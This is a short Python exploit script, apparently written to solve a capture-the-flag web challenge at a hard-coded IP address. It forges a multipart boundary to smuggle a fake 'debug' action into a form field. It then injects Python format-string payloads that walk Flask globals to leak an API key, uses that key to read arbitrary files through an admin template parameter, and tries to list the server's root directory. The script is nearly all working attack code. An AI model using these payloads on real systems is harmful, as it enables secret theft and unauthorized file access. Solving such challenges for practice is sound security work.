import httpx

TARGET = "http://223.6.249.127:36894"
BOUNDARY = "---------------------------FlagBoundary123"

def debug_payload(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    print(f"[*] Payload length: {len(text)} (max 300)")
    if len(text) > 300:
        print("[-] Payload too long!")
        return None
    
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text

def get_api_key():
    return debug_payload("{0.view_functions[action].__globals__[API_KEY]}")

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
    return r.text

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # Try different payloads to list files
    payloads = [
        # Using os module which is already imported
        "{0.view_functions[action].__globals__[os].listdir('/')}",
        # Short glob
        "{0.__class__.__mro__[1].__subclasses__()}",
    ]
    
    for p in payloads:
        print(f"\n[*] Trying: {p[:50]}...")
        result = debug_payload(p)
        print(f"Result: {result[:200] if result else 'None'}...")
